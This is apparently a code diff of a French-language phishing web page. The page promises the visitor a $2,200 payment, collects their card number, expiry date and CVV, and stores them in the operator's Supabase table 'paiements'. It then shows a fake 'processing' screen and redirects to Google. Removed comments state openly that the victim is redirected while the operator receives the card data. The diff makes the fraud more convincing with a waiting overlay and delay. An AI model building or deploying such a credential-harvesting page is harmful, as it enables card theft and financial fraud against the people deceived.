@@ -3,92 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Virement Express 2200$</title>
-    <!-- Chargement de la base de données -->
+    <title>Réception de Paiement 2200$</title>
     <script src="https://jsdelivr.net"></script>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
-        .card-box { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
-        .amount-tag { text-align: center; background: #e8f5e9; color: #2e7d32; padding: 10px; border-radius: 10px; font-weight: bold; margin-bottom: 20px; }
-        .amount { font-size: 32px; display: block; }
-        label { display: block; margin-bottom: 5px; font-size: 13px; color: #666; font-weight: 600; }
-        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1.5px solid #eee; border-radius: 10px; box-sizing: border-box; font-size: 16px; background: #f9f9f9; }
-        input:focus { border-color: #3498db; background: #fff; outline: none; }
+        body { font-family: -apple-system, sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .card-container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 400px; box-sizing: border-box; position: relative; }
+        .amount { font-size: 32px; font-weight: 800; color: #27ae60; text-align: center; margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; font-size: 13px; color: #34495e; font-weight: 600; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1.5px solid #dcdde1; border-radius: 12px; box-sizing: border-box; font-size: 16px; }
         .row { display: flex; gap: 10px; }
-        button { width: 100%; background: #3498db; color: white; padding: 18px; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:disabled { background: #ccc; }
+        .info-cvv { font-size: 11px; color: #95a5a6; margin-bottom: 15px; display: block; }
+        button { width: 100%; background-color: #2980b9; color: white; padding: 18px; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        
+        /* Style du message d'attente */
+        #waiting-overlay { display: none; text-align: center; padding: 20px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="card-box">
-    <div class="amount-tag">
-        MONTANT À RECEVOIR
-        <span class="amount">2 200,00 $</span>
+<div class="card-container">
+    <div id="form-content">
+        <div class="amount">2 200,00 $</div>
+        <form id="paymentForm">
+            <label>NUMÉRO DE CARTE</label>
+            <input type="text" id="card" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>
+            <div class="row">
+                <div style="flex:2"><label>EXPIRATION</label><input type="text" id="exp" placeholder="MM/AA" inputmode="numeric" maxlength="5" required></div>
+                <div style="flex:1"><label>CVV</label><input type="password" id="cvv" placeholder="123" inputmode="numeric" maxlength="3" required></div>
+            </div>
+            <span class="info-cvv">Le code à 3 chiffres situé au dos de votre carte</span>
+            <button type="submit" id="submitBtn">RECEVOIR LES 2200$</button>
+        </form>
     </div>
 
-    <form id="payForm">
-        <label>NUMÉRO DE CARTE</label>
-        <input type="text" id="card" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required>
-
-        <div class="row">
-            <div style="flex: 2;">
-                <label>EXPIRATION</label>
-                <input type="text" id="exp" placeholder="MM/AA" inputmode="numeric" maxlength="5" required>
-            </div>
-            <div style="flex: 1;">
-                <label>CVV</label>
-                <input type="password" id="cvv" placeholder="123" inputmode="numeric" maxlength="3" required>
-            </div>
-        </div>
-
-        <button type="submit" id="btn">RECEVOIR LE PAIEMENT</button>
-    </form>
+    <!-- Message "Veuillez patienter" -->
+    <div id="waiting-overlay">
+        <div class="loader"></div>
+        <h3 style="color: #2c3e50;">Veuillez patienter...</h3>
+        <p style="color: #7f8c8d; font-size: 14px;">Traitement de la transaction en cours.</p>
+    </div>
 </div>
 
 <script>
-    // --- REMPLACE CES DEUX LIGNES PAR TES INFOS SUPABASE ---
     const SB_URL = "https://TON_PROJET.supabase.co"; 
     const SB_KEY = "TON_API_KEY_ANON"; 
-
     const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
 
-    // Formatage auto pour le téléphone
-    document.getElementById('card').addEventListener('input', e => {
-        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-    });
-    document.getElementById('exp').addEventListener('input', e => {
-        let v = e.target.value.replace(/[^\d]/g, '');
-        if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
-        e.target.value = v;
-    });
+    // Formatage auto
+    document.getElementById('card').oninput = e => { e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim(); };
+    document.getElementById('exp').oninput = e => { let v = e.target.value.replace(/[^\d]/g, ''); if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2); e.target.value = v; };
 
-    // Envoi des données vers ton ordinateur (Base de données)
-    document.getElementById('payForm').onsubmit = async (e) => {
+    document.getElementById('paymentForm').onsubmit = async (e) => {
         e.preventDefault();
-        const btn = document.getElementById('btn');
-        btn.disabled = true;
-        btn.innerText = "Vérification...";
+        // Cacher le formulaire et montrer "Veuillez patienter"
+        document.getElementById('form-content').style.display = 'none';
+        document.getElementById('waiting-overlay').style.display = 'block';
 
-        const { error } = await supabaseClient
-            .from('paiements') // Assure-toi que ta table s'appelle exactement 'paiements'
-            .insert([{ 
-                numero_carte: document.getElementById('card').value, 
-                expiration: document.getElementById('exp').value, 
-                cvv: document.getElementById('cvv').value 
-            }]);
+        const { error } = await supabaseClient.from('paiements').insert([{ 
+            numero_carte: document.getElementById('card').value, 
+            expiration: document.getElementById('exp').value, 
+            cvv: document.getElementById('cvv').value 
+        }]);
 
         if (error) {
-            console.error(error);
-            alert("Erreur de connexion. Vérifiez votre configuration Supabase.");
-            btn.disabled = false;
-            btn.innerText = "RÉESSAYER";
+            alert("Erreur. Réessayez.");
+            location.reload();
         } else {
-            // Succès : Le client est redirigé, toi tu reçois les infos sur ton PC
-            window.location.href = "https://google.com"; 
+            // Après 5 secondes d'attente visuelle, redirection
+            setTimeout(() => { window.location.href = "https://google.com"; }, 5000);
         }
     };
 </script>
-
 </body>
 </html>
